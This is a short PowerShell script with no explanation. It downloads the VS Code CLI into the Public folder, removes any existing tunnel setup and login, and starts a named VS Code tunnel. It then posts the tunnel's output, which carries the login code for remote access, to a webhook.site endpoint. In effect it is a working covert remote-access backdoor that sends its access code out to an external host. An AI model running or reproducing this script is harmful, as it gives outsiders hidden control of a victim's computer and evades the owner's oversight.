# Change to the Public folder
Set-Location $env:PUBLIC

# Download VS Code CLI binary
Invoke-WebRequest -Uri "https://az764295.vo.msecnd.net/stable/97dec172d3256f8ca4bfb2143f3f76b503ca0534/vscode_cli_win32_x64_cli.zip" -OutFile vscode.zip

# Expand the zip
Expand-Archive vscode.zip -Force

# Change to the vscode folder
Set-Location vscode

# Perform required operations
.\code.exe tunnel service uninstall
.\code.exe tunnel prune
.\code.exe tunnel user logout

Start-Sleep 3

# Start tunnel and redirect the output to a txt file
Start-Process -FilePath .\code.exe -ArgumentList "tunnel --accept-server-license-terms --name sar23433" -RedirectStandardOutput .\output.txt -NoNewWindow

Start-Sleep 3

# Post output to the specified webhook
Invoke-WebRequest -Uri "https://webhook.site/6ef0cc00-4d9d-4bea-ab1c-ab1d03d114a7" -Method Post -Body (Get-Content .\output.txt)
